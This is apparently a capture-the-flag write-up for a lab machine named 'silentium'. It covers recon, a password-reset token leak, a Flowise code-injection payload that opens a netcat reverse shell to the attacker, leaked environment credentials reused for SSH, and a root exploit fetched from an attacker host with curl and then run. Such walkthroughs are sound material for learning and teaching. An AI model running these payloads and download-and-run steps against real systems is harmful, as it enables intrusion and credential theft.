## NMAP SCAN 
```
nmap -A 10.129.185.120                                                                                                                                                                                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-11 21:22 +0700
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.12% done; ETC: 21:22 (0:00:00 remaining)
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.65% done; ETC: 21:23 (0:00:00 remaining)
Nmap scan report for silentium.htb (10.129.185.120)
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   79.07 ms 10.10.14.1
2   79.25 ms silentium.htb (10.129.185.120)
```

lets ffuf since there is a web page 
```
ffuf -u http://10.129.245.103 -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.245.103
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 110ms]
:: Progress: [19966/19966] :: Job [1/1] :: 451 req/sec :: Duration: [0:00:43] :: Errors: 0 ::

```

found another page 

found 3 names on the normal web site and the staging one has login page we can reset the pass 
lets use the usernames of the persons we found and get the pass reset using burpsuite
![[Pasted image 20260510150858.png]]


we reset the password of ben and got the tockent needed for new pass 
```
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 10 May 2026 09:42:18 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Access-Control-Allow-Origin: http://staging.silentium.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-aBp++21r7vp8+q8sDIb0ZvLosUQ"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"hx7LmFZ21y3TJHtM14wGHWvO42Fo5k6nqDwiGPfYwx6180fhAvJsypKa7Kh4S3Za","tokenExpiry":"2026-05-10T09:57:18.314Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-05-10T09:42:18.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```
ben is an admin 
![[Pasted image 20260510151704.png]]

so it is a flowise site.... 

Flowise 3.0.5, the `/api/v1/node-load-method/customMCP` endpoint was found to be vulnerable to Insecure Code Evaluation
found api key 
```
hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
```

lets create a payload 
```
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.59 4444 >/tmp/f');return 1;})()} )"
  }
}
```
lets upload it and get a shell 
```
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" -H "Content-Type: application/json" -d payload.json 
{"statusCode":400,"success":false,"message":"Unexpected token 'p', \"payload.json\" is not valid JSON","stack":{}}
```

```
nc -lvnp 4444   
listening on [any] 4444 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.245.103] 37659
sh: can't access tty; job control turned off
/ # 

```

and we have the shell 
```
/ # ls -lA
total 60
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 .dockerenv
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin
drwxr-xr-x    5 root     root           340 May 10 09:34 dev
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 etc
drwxr-xr-x    1 root     root          4096 Jul 16  2025 home
drwxr-xr-x    1 root     root          4096 Jul 15  2025 lib
drwxr-xr-x    5 root     root          4096 Jul 15  2025 media
drwxr-xr-x    2 root     root          4096 Jul 15  2025 mnt
drwxr-xr-x    1 root     root          4096 Jul 16  2025 opt
dr-xr-xr-x  282 root     root             0 May 10 09:34 proc
drwx------    1 root     root          4096 Apr  8 09:41 root
drwxr-xr-x    3 root     root          4096 Jul 15  2025 run
drwxr-xr-x    2 root     root          4096 Jul 15  2025 sbin
drwxr-xr-x    2 root     root          4096 Jul 15  2025 srv
dr-xr-xr-x   13 root     root             0 May 10 09:34 sys
drwxrwxrwt    1 root     root          4096 May 10 09:57 tmp
drwxr-xr-x    1 root     root          4096 Apr  8 09:41 usr
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var
```

i think we are inside a docker 
```
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/home
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```
got password i think we can try ssh 
```
ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt
b6d6d305e58464dfa6fda8147aaf2162
```

and we have the user flag 
```
ben@silentium:~$ curl http://10.10.14.66/dirtyfrag --output dirtyfrag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 58760  100 58760    0     0   185k      0 --:--:-- --:--:-- --:--:--  186k
ben@silentium:~$ ls
dirtyfrag  user.txt
```

we will upload dirtyfrag which will allow us to get root 
```
ben@silentium:~$ chmod +x dirtyfrag
ben@silentium:~$ ./dirtyfrag
root@silentium:~# ls
gogs-repositories  root.txt
root@silentium:~# cat root.txt
3e9ec9243807e73c6292662e035559d0
```

and we have the root flag